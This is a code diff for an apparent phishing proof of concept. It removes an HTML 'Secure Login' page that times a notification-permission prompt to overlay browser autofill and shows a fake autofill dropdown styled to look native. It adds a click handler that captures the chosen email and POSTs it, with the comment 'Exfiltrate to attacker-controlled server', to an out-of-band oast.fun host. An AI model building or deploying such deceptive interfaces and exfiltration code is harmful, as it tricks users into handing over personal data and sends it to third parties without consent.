@@ -1,90 +1,14 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Secure Login</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 50px;
-      background: #f4f4f4;
-    }
+fakeAutofill.addEventListener('click', e => {
+  if (e.target.tagName === 'SPAN') {
+    const email = e.target.innerText;
+    emailInput.value = email;
+    fakeAutofill.style.display = 'none';
 
-    .login-box {
-      background: white;
-      padding: 30px;
-      max-width: 400px;
-      margin: auto;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      position: relative;
-    }
-
-    input[type="email"] {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      margin-bottom: 20px;
-    }
-
-    #fakeAutofill {
-      display: none;
-      position: absolute;
-      top: 75px;
-      left: 30px;
-      background: white;
-      border: 1px solid #ccc;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      z-index: 9999;
-      padding: 10px;
-      width: 90%;
-    }
-
-    #fakeAutofill span {
-      display: block;
-      padding: 5px 0;
-      cursor: pointer;
-      color: #333;
-    }
-
-    #fakeAutofill span:hover {
-      background-color: #f0f0f0;
-    }
-  </style>
-</head>
-<body>
-
-<div class="login-box">
-  <h2>Sign in to your account</h2>
-  <input id="emailInput" type="email" name="email" autocomplete="email" placeholder="Email address" />
-  <div id="fakeAutofill">
-    <span>yourrealemail@gmail.com</span>
-    <span>alt.email@domain.com</span>
-  </div>
-</div>
-
-<script>
-  const emailInput = document.getElementById('emailInput');
-  const fakeAutofill = document.getElementById('fakeAutofill');
-
-  emailInput.addEventListener('focus', () => {
-    // Step 1: Ask permission after slight delay to overlay autofill
-    setTimeout(() => {
-      Notification.requestPermission().then(() => {});
-    }, 200);  // enough to let autofill trigger first
-
-    // Step 2: Show fake autofill dropdown (looks like native)
-    setTimeout(() => {
-      fakeAutofill.style.display = 'block';
-    }, 800);
-  });
-
-  fakeAutofill.addEventListener('click', e => {
-    if (e.target.tagName === 'SPAN') {
-      emailInput.value = e.target.innerText;
-      fakeAutofill.style.display = 'none';
-    }
-  });
-</script>
-
-</body>
-</html>
+    // 🚨 Exfiltrate to attacker-controlled server
+    fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ stolenEmail: email })
+    });
+  }
+});
